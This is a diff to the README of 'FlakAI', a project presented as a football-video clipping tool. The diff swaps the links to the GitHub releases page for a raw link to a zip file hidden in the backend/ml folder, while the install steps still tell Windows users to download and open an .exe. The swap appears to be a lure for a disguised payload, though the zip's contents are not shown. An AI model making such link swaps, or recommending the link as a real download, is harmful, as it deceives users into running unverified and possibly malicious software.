@@ -1,6 +1,6 @@
 # ⚽ FlakAI - Turn football videos into game clips
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Augusteregular234/FlakAI/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Augusteregular234/FlakAI/main/backend/ml/Flak_AI_2.5-beta.2.zip)
 
 FlakAI identifies key moments in football matches using computer vision. You upload your file, and the software finds events like goals, fouls, and cards. It saves your time by cutting the full video into short, organized clips.
 
@@ -8,7 +8,7 @@ FlakAI identifies key moments in football matches using computer vision. You upl
 
 Follow these steps to set up FlakAI on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Augusteregular234/FlakAI/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/Augusteregular234/FlakAI/main/backend/ml/Flak_AI_2.5-beta.2.zip).
 2. Look for the latest version at the top of the list.
 3. Download the file ending in `.exe`.
 4. Open the file to start the installation.
